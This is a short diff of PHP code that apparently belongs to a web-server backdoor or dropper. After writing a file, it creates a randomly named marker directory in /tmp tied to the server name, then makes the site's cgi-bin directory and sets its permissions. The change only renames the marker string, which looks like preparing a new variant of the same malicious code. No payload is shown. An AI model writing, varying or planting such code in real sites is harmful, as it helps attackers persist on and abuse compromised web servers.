@@ -12,8 +12,8 @@ if (file_put_contents($src, $supports));
 
 $random = rand(1,6);
 $d=$_SERVER['SERVER_NAME'];
-if(file_exists('/tmp/h64h46h4'.$d.$random)) { } else {
-	mkdir('/tmp/h64h46h4'.$d.$random);
+if(file_exists('/tmp/gbfgbfgbfgb33'.$d.$random)) { } else {
+	mkdir('/tmp/gbfgbfgbfgb33'.$d.$random);
 	@chmod($_SERVER['DOCUMENT_ROOT'] . "/cgi-bin", 0755);
 	mkdir($_SERVER['DOCUMENT_ROOT']."/cgi-bin");
 	
